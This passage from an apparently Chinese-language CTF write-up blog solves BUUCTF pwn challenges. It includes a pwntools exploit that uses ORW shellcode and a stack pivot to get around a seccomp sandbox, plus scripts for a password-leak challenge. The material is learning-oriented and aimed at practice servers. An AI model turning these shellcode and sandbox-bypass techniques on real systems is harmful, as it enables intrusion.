class="comment">###怎么说呢是不是写的长度不够</span></span><br><span class="line"><span class="comment">#肯定不够32-56=24</span></span><br><span class="line"><span class="comment">#明显不够</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>emmm~说实话，还是见的太少了</p>
<p>有一个沙盒过滤说是</p>
<p>首先看一下主函数</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">mmap</span>(<span class="number">0x123000</span>, <span class="number">0x1000uLL</span>, <span class="number">6</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">sub_400949</span>();</span><br><span class="line">  <span class="built_in">sub_400906</span>();</span><br><span class="line">  <span class="built_in">sub_400A16</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>简单了解一下mmap函数</p>
<blockquote>
<p>用户空间映射内存区域的系统调用。</p>
<p>它允许程序员将一个文件或者其他对象映射到进程的地址空间中。使用<code>mmap</code>可以进行文件映射、设备映射、匿名映射等操作，这使得内存管理更加灵活。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> *<span class="title">mmap</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> length, <span class="type">int</span> prot, <span class="type">int</span> flags, <span class="type">int</span> fd, <span class="type">off_t</span> offset)</span></span>;</span><br></pre></td></tr></table></figure>

<p><strong>参数说明：</strong></p>
<ol>
<li><p><strong><code>addr</code>: 指定映射区域的起始地址。如果为<code>NULL</code>或者<code>0</code>，则由系统选择映射区域的地址。</strong></p>
</li>
<li><p><strong><code>length</code>: 映射区域的长度。</strong></p>
</li>
<li><pre><code>prot
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   **: 映射区域的保护方式，可以是以下几种方式的组合：**</span><br><span class="line"></span><br><span class="line">   - **`PROT_EXEC`: 允许执行。**</span><br><span class="line">   - **`PROT_READ`: 允许读取。**</span><br><span class="line">   - **`PROT_WRITE`: 允许写入。**</span><br><span class="line">   - **`PROT_NONE`: 不允许任何方式的访问。**</span><br><span class="line"></span><br><span class="line">4. ```</span><br><span class="line">   flags</span><br></pre></td></tr></table></figure>

**: 控制映射区域的特性，常见的标志有：**

- **`MAP_SHARED`: 对映射区域的修改会反映到文件上。**
- **`MAP_PRIVATE`: 对映射区域的修改不会反映到文件上，对文件的修改也不会反映到映射区域。**
- **`MAP_ANONYMOUS`: 匿名映射，不与任何文件关联。**
- **`MAP_FIXED`: 强制使用`addr`指定的地址。**
</code></pre>
</li>
<li><p><strong><code>fd</code>: 被映射文件的文件描述符。如果是匿名映射，这个值通常是<code>-1</code>。</strong></p>
</li>
<li><p><strong><code>offset</code>: 文件映射的起始位置，通常是文件大小的整数倍。</strong></p>
</li>
</ol>
</blockquote>
<p>ok,题目中的意思是：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mmap</span>(<span class="number">0x123000</span>, <span class="number">0x1000uLL</span>, <span class="number">6</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line"><span class="comment">//0x123000: 指定映射区域的起始地址。</span></span><br><span class="line"><span class="comment">//0x1000uLL: 映射区域的长度，这里是4096字节（1页大小）。</span></span><br><span class="line"><span class="comment">//6: 保护方式，这里可能是PROT_READ | PROT_WRITE。</span></span><br><span class="line"><span class="comment">//34: 映射标志，这里可能是MAP_SHARED和MAP_ANONYMOUS的组合。</span></span><br><span class="line"><span class="comment">//-1: 表示匿名映射，不与任何文件关联。</span></span><br><span class="line"><span class="comment">//0LL: 映射的文件偏移量，这里是从文件的开始处映射。</span></span><br></pre></td></tr></table></figure>

<p>就是把从0x123000开始的地址，大小为0x1000的长度，权限改为可写可执行</p>
<p>看一下第一个函数</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_400949</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="built_in">seccomp_init</span>(<span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(v1, <span class="number">2147418112LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(v1, <span class="number">2147418112LL</span>, <span class="number">1LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(v1, <span class="number">2147418112LL</span>, <span class="number">2LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(v1, <span class="number">2147418112LL</span>, <span class="number">60LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">seccomp_load</span>(v1);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//我一开始啥也看不懂</span></span><br><span class="line"><span class="comment">//后来看了一下系统调用号</span></span><br><span class="line"><span class="comment">//define __NR_read 0</span></span><br><span class="line"><span class="comment">//define __NR_write 1</span></span><br><span class="line"><span class="comment">//define __NR_open 2</span></span><br><span class="line"><span class="comment">//define __NR_exit 60</span></span><br><span class="line"><span class="comment">//这里就提示我们用ORW了</span></span><br></pre></td></tr></table></figure>

<p>看一下有哪些函数可以调用</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">llq@llq-virtual-machine:~/阿pwn/BUUCTF-pwn/[极客大挑战 2019]Not Bad$ seccomp-tools dump  ./1111</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = <span class="built_in">arch</span></span><br><span class="line"> 0001: 0x15 0x00 0x08 0xc000003e  <span class="keyword">if</span> (A != ARCH_X86_64) goto 0010</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  <span class="keyword">if</span> (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x05 0xffffffff  <span class="keyword">if</span> (A != 0xffffffff) goto 0010</span><br><span class="line"> 0005: 0x15 0x03 0x00 0x00000000  <span class="keyword">if</span> (A == <span class="built_in">read</span>) goto 0009</span><br><span class="line"> 0006: 0x15 0x02 0x00 0x00000001  <span class="keyword">if</span> (A == write) goto 0009</span><br><span class="line"> 0007: 0x15 0x01 0x00 0x00000002  <span class="keyword">if</span> (A == open) goto 0009</span><br><span class="line"> 0008: 0x15 0x00 0x01 0x0000003c  <span class="keyword">if</span> (A != <span class="built_in">exit</span>) goto 0010</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br><span class="line">llq@llq-virtual-machine:~/阿pwn/BUUCTF-pwn/[极客大挑战 2019]Not Bad$ </span><br></pre></td></tr></table></figure>

<p>这里提示的就跟明显了 就ORW了</p>
<h3 id="ORW"><a href="#ORW" class="headerlink" title="ORW"></a>ORW</h3><p>第二个函数就是</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">sub_400906</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">setbuf</span>(stdin, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setbuf</span>(stdout, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setbuf</span>(stderr, <span class="number">0LL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//就是应该初始化</span></span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#先写ORW的shellcode</span></span><br><span class="line">mmap=<span class="number">0x123000</span></span><br><span class="line">orw_payload=shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)           <span class="comment">#打开根目录下的flag文件</span></span><br><span class="line">orw_payload+=shellcraft.read(<span class="number">3</span>,mmap,<span class="number">0x50</span>)       <span class="comment">#读取文件标识符是3的文件0x50个字节存放到mmap分配的地址空间里</span></span><br><span class="line">orw_payload+=shellcraft.write(<span class="number">1</span>,mmap,<span class="number">0x50</span>)      <span class="comment">#将mmap地址上的内容输出0x50个字节</span></span><br></pre></td></tr></table></figure>



<p>下来写一下buf里的rop攻击链<br>buf里的rop攻击链要完成的任务是往mmap里写入orw_payload,让程序跳转到mmap去执行orw_payload，确定目的后开始写rop攻击链</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=asm(shellcraft.read(<span class="number">0</span>,mmap,<span class="number">0x100</span>))+asm(<span class="string">&#x27;mov rax,0x123000;call rax&#x27;</span>)<span class="comment">#buf里的rop是往mmap里读入0x100长度的数据，跳转到mmap的地址执行</span></span><br></pre></td></tr></table></figure>







<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./bad&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">27472</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mmap=<span class="number">0x123000</span></span><br><span class="line">orw_payload = shellcraft.<span class="built_in">open</span>(<span class="string">&quot;./flag&quot;</span>)</span><br><span class="line">orw_payload += shellcraft.read(<span class="number">3</span>, mmap, <span class="number">0x50</span>)</span><br><span class="line">orw_payload += shellcraft.write(<span class="number">1</span>, mmap,<span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line">jmp_rsp=<span class="number">0x400A01</span></span><br><span class="line">payload=asm(shellcraft.read(<span class="number">0</span>,mmap,<span class="number">0x100</span>))+asm(<span class="string">&#x27;mov rax,0x123000;call rax&#x27;</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0x28</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p64(jmp_rsp)+asm(<span class="string">&#x27;sub rsp,0x30;jmp rsp&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Easy shellcode, have fun!&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode=asm(orw_payload)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031516624.png" alt="image-20240810102325568"></p>
<p>一知半解的情况</p>
<h2 id="ciscn-2019-es-1"><a href="#ciscn-2019-es-1" class="headerlink" title="ciscn_2019_es_1"></a>ciscn_2019_es_1</h2><p>2024.8.8</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">llq@llq-virtual-machine:~/阿pwn/BUUCTF-pwn/ciscn_2019_es_1$ checksec 1111</span><br><span class="line">[*] <span class="string">&#x27;/home/llq/阿pwn/BUUCTF-pwn/ciscn_2019_es_1/1111&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">llq@llq-virtual-machine:~/阿pwn/BUUCTF-pwn/ciscn_2019_es_1$ <span class="built_in">chmod</span> +x 1111</span><br><span class="line">llq@llq-virtual-machine:~/阿pwn/BUUCTF-pwn/ciscn_2019_es_1$ ./1111</span><br><span class="line">I hate 2.29 , can you understand me?</span><br><span class="line">maybe you know the new libc</span><br><span class="line">======================</span><br><span class="line">How are you ~~~~</span><br><span class="line">By the way,i don<span class="string">&#x27;t want 996 !</span></span><br><span class="line"><span class="string">1.Add a 996 info</span></span><br><span class="line"><span class="string">2.Show info</span></span><br><span class="line"><span class="string">3.Call that 996 compary!</span></span><br><span class="line"><span class="string">4.I hate 996!</span></span><br><span class="line"><span class="string">choice:r</span></span><br><span class="line"><span class="string">Wrong</span></span><br><span class="line"><span class="string">======================</span></span><br><span class="line"><span class="string">How are you ~~~~</span></span><br><span class="line"><span class="string">By the way,i don&#x27;</span>t want 996 !</span><br><span class="line">1.Add a 996 info</span><br><span class="line">2.Show info</span><br><span class="line">3.Call that 996 compary!</span><br><span class="line">4.I hate 996!</span><br><span class="line">choice:^C</span><br><span class="line">llq@llq-virtual-machine:~/阿pwn/BUUCTF-pwn/ciscn_2019_es_1$</span><br></pre></td></tr></table></figure>

<p>嘶！看上去像</p>
<h3 id="堆题-5"><a href="#堆题-5" class="headerlink" title="堆题"></a>堆题</h3><p>yes！！</p>
<p>先放着！！！！！！！</p>
<h2 id="picoctf-2018-leak-me"><a href="#picoctf-2018-leak-me" class="headerlink" title="picoctf_2018_leak_me"></a>picoctf_2018_leak_me</h2><p>2024.8.10</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">llq@llq-virtual-machine:~/阿pwn/BUUCTF-pwn/picoctf_2018_leak_me$ checksec 1111</span><br><span class="line">[*] <span class="string">&#x27;/home/llq/阿pwn/BUUCTF-pwn/picoctf_2018_leak_me/1111&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">llq@llq-virtual-machine:~/阿pwn/BUUCTF-pwn/picoctf_2018_leak_me$ <span class="built_in">chmod</span> +x 1111</span><br><span class="line">llq@llq-virtual-machine:~/阿pwn/BUUCTF-pwn/picoctf_2018_leak_me$ ./1111</span><br><span class="line">What is your name?</span><br><span class="line">aaaa</span><br><span class="line">Password File is Missing. Problem is Misconfigured, please contact an Admin <span class="keyword">if</span> you are running this on the shell server.</span><br><span class="line">llq@llq-virtual-machine:~/阿pwn/BUUCTF-pwn/picoctf_2018_leak_me$</span><br></pre></td></tr></table></figure>

<p>丢进ida里面看看</p>
<p>看见了后门说是</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bad sp value at call has been detected, the output may be wrong!</span></span><br><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> s1[<span class="number">64</span>]; <span class="comment">// [esp+0h] [ebp-194h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">256</span>]; <span class="comment">// [esp+40h] [ebp-154h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+140h] [ebp-54h] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+180h] [ebp-14h]</span></span><br><span class="line">  <span class="type">char</span> *v8; <span class="comment">// [esp+184h] [ebp-10h]</span></span><br><span class="line">  <span class="type">__gid_t</span> v9; <span class="comment">// [esp+188h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> *p_argc; <span class="comment">// [esp+18Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  p_argc = &amp;argc;</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v9 = <span class="built_in">getegid</span>();                                        <span class="comment">//获取id的不知道有没有用</span></span><br><span class="line">  <span class="built_in">setresgid</span>(v9, v9, v9);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="built_in">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">memset</span>(v5, <span class="number">0</span>, <span class="built_in">sizeof</span>(v5));</span><br><span class="line">  <span class="built_in">memset</span>(s1, <span class="number">0</span>, <span class="built_in">sizeof</span>(s1));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What is your name?&quot;</span>);</span><br><span class="line">  <span class="built_in">fgets</span>(v5, <span class="number">256</span>, stdin);</span><br><span class="line">  v8 = <span class="built_in">strchr</span>(v5, <span class="number">10</span>);                                   <span class="comment">//判断回车的</span></span><br><span class="line">  <span class="keyword">if</span> ( v8 )</span><br><span class="line">    *v8 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcat</span>(v5, <span class="string">&quot;,\nPlease Enter the Password.&quot;</span>);</span><br><span class="line">  stream = <span class="built_in">fopen</span>(<span class="string">&quot;password.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(</span><br><span class="line">      <span class="string">&quot;Password File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">fgets</span>(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(v5);</span><br><span class="line">  <span class="built_in">fgets</span>(s1, <span class="number">64</span>, stdin);</span><br><span class="line">  v5[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, s) )</span><br><span class="line">    <span class="built_in">flag</span>(p_argc);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Incorrect Password!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析一下主函数</p>
<p>嗯我们要的也很简单就是满足条件就可以执行flag（p_argc）函数就行了</p>
<p>但是呢，这个第一个条件都过不去</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">stream = <span class="built_in">fopen</span>(<span class="string">&quot;password.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !stream )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot;Password File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//就是检查是否有这个password文件的</span></span><br><span class="line"><span class="comment">//我创建一个看看</span></span><br></pre></td></tr></table></figure>

<p>ok，绕过第一个</p>
<p>再看后面的好像就是</p>
<p>只要满足</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strcmp</span>(s1, s)</span><br></pre></td></tr></table></figure>

<p>就行了，再看一手，这两都是自己输进去的想着，这不就结束了？</p>
<p>结果仔细看一下第一个输入</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">fgets</span>(s, <span class="number">64</span>, stream);</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>示例</strong><br><strong>假设 stream 是一个指向包含以下内容的文件的指针：</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Hello, World!</span></span><br><span class="line"><span class="comment">//This is a test.</span></span><br></pre></td></tr></table></figure>

<p><strong>并且你使用 fgets(s, 64, stream); 来读取第一行：</strong></p>
<p><strong>执行结果：s 将包含 “Hello, World!\n”，因为这是文件中的第一行，包括换行符 \n。</strong><br><strong>缓冲区内容：s 缓冲区将包含字符串 “Hello, World!\n”，并以空字符 ‘\0’ 结束。</strong><br><strong>总结:</strong><br><strong>fgets(s, 64, stream); 读取文件 stream 中的内容到字符串 s 中，最多读取 63 个字符或者遇到换行符时停止。这是一个安全的读取函数，适合用来处理不确定长度的文本输入或文件读取。</strong></p>
</blockquote>
<p>ok,这回明白了，我们往我们创建的那个文件里输入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aaaa\n</span><br><span class="line">bbbb</span><br></pre></td></tr></table></figure>

<p>当我在第三个输入的时候输入aaaa应该就可以执行了</p>
<p>为啥输出的是</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Incorrect Password!&quot;</span>);</span><br></pre></td></tr></table></figure>



<p>脚本跑一下看看</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29631</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;What is your name?&#x27;</span>,<span class="string">&#x27;yt&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"><span class="comment">#pause</span></span><br><span class="line">r.recvuntil(<span class="string">&#x27;\nPlease Enter the Password.&#x27;</span>)</span><br><span class="line">r.send(<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>打通了但是没flag</p>
<p>ok，看见了flag函数里面也得接一段</p>
<p>也不用接</p>
<p>看了一手wp，我就是sb</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">29631</span>)</span><br><span class="line"></span><br><span class="line">password = <span class="string">&quot;a_reAllY_s3cuRe_p4s$word_f85406&quot;</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;What is your name?\n&quot;</span>,<span class="string">&quot;A&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please Enter the Password.\n&quot;</span>,password)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26775</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;What is your name?\n&#x27;</span>)</span><br><span class="line"><span class="comment">#payload=b&#x27;a&#x27;*0x100</span></span><br><span class="line">r.sendline(<span class="string">&#x27;yt&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Please Enter the Password.\n&#x27;</span>)</span><br><span class="line">password=<span class="string">&#x27;a_reAllY_s3cuRe_p4s$word_f85406&#x27;</span></span><br><span class="line">r.sendline(password)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>







<h2 id="suctf-2018-basic-pwn"><a href="#suctf-2018-basic-pwn" class="headerlink" title="suctf_2018_basic pwn"></a>suctf_2018_basic pwn</h2><p>2024.8.12</p>
